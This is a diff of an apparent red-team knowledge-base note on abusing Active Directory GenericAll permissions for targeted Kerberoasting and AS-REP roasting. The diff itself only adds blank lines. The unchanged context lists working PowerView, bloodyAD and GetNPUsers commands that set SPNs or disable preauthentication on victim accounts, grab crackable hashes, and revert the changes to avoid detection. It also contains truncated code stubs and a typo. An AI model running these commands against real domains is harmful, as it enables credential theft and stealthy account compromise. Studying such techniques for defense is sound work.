@@ -47,6 +47,8 @@ This procedure involves abusing Active Directory ACLs/ACEs to gain access to Ker
 
 From a technical standpoint, this procedure involves querying Active Directory for accounts with the GenericAll permission, and then using tools such as Rubeus or Impacket to request and extract Kerberos tickets. Business value of this attack includes gaining access to sensitive data, such as financial information, intellectual property, or personally identifiable information (PII).
 
+ 
+
 ## Requirements
 
 1. Valid domain credentials
@@ -54,6 +56,8 @@ From a technical standpoint, this procedure involves querying Active Directory f
 1. Access to a domain-joined Windows machine
 
 1. Tools such as Rubeus or Impacket
+
+ 
 
 ## Defense
 
@@ -63,6 +67,8 @@ From a technical standpoint, this procedure involves querying Active Directory f
 
 1. Implement strong password policies to mitigate the risk of password cracking
 
+ 
+
 ## Objectives
 
 1. Extract Kerberos tickets for user accounts with the GenericAll permission
@@ -70,6 +76,8 @@ From a technical standpoint, this procedure involves querying Active Directory f
 1. Crack Kerberos tickets offline to reveal user passwords
 
 1. Gain access to sensitive information and data
+
+ 
 
 # Instructions
 
@@ -80,10 +88,18 @@ From a technical standpoint, this procedure involves querying Active Directory f
 4. Use Get-DomainSPNTicket to grab the ticket.
 5. Use Set-DomainObject to remove the SPN.
 
+ 
+
+
+
 **Code**: [[# Check for interesting permissions on accounts:
 I]]
 
+
+
 > Kerberoasting via SPN is a technique used to extract password hashes from Active Directory. This technique involves setting an SPN on a target account, requesting a Service Ticket (ST), and then using the hash of the ST to perform a Kerberoasting attack. The SPN can be set using the Set-DomainObject cmdlet in PowerView2 or PowerView3. Once the SPN has been set, the Get-DomainSPNTicket cmdlet can be used to grab the ticket. Finally, the Set-DomainObject cmdlet can be used to remove the SPN.
+
+
 
 **Command** ([[Check for interesting permissions on accounts]]):
 
@@ -91,11 +107,19 @@ I]]
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 ```
 
+
+
+
+
 **Command** ([[Check if current user has already an SPN setted]]):
 
 ```bash
 PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
 ```
+
+
+
+
 
 **Command** ([[Force set the SPN on the account: Targeted Kerberoasting]]):
 
@@ -103,6 +127,10 @@ PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
 PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
 ```
+
+
+
+
 
 **Command** ([[Grab the ticket]]):
 
@@ -112,24 +140,42 @@ PowerView2 > $User | Get-DomainSPNTicket | fl
 PowerView2 > $User | Select serviceprincipalname
 ```
 
+
+
+
+
 **Command** ([[Remove the SPN]]):
 
 ```bash
 PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
 ```
 
+
+
 2. To use this command, replace 'username' with the name of the victim's account and 'domain.local' with the name of the domain. Run the command in PowerShell with appropriate privileges.
+
+ 
+
+
 
 **Code**: [[# Modify the userAccountControl
 PowerView2 > Get-D]]
 
+
+
 > This command allows an attacker to obtain a user's AS-REP hash, which can be cracked offline to obtain the user's password. The attack works by modifying the victim's 'userAccountControl' attribute to disable Kerberos preauthentication, which allows the attacker to request the AS-REP hash without providing a valid password. Once the hash is obtained, the attribute is changed back to its original value to avoid detection.
+
+
 
 **Command** ([[Convert userAccountControl value]]):
 
 ```bash
 PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
 ```
+
+
+
+
 
 **Command** ([[Modify userAccountControl value]]):
 
@@ -137,11 +183,19 @@ PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
 PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+
+
+
+
 **Command** ([[Grab ASREP hash]]):
 
 ```bash
 ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
 ```
+
+
+
+
 
 **Command** ([[Revert userAccountControl value]]):
 
@@ -149,16 +203,28 @@ ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
 PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+
+
+
+
 **Command** ([[Convert userAccountControl value]]):
 
 ```bash
 PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
 ```
 
+
+
 3. To modify the userAccountControl and grab a ticket, follow these steps:
+
+ 
+
+
 
 **Code**: [[# Modify the userAccountControl
 $ bloodyAD.py --ho]]
+
+
 
 > 1. Replace [DC IP] with the IP address of the domain controller.
 2. Replace [DOMAIN] with the name of the domain.
@@ -171,11 +237,17 @@ $ bloodyAD.py --ho]]
 9. Replace <output_AS_REP_responses_file> with the desired name for the output file.
 10. Run the third command to set back the userAccountControl.
 
+
+
 **Command** ([[Modify user account control for [Target_User]]]):
 
 ```bash
 $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
 ```
+
+
+
+
 
 **Command** ([[Grab the ticket for [Target_User]]]):
 
@@ -183,11 +255,17 @@ $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUs
 $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
 
+
+
+
+
 **Command** ([[Set back the user account control for [Target_User]]]):
 
 ```bash
 $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -225,3 +303,5 @@ $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUs
 - [[Abusing Active Directory ACLs/ACEs]]
 - [[Active Directory Attacks]]
 - [[GenericAll]]
+
+
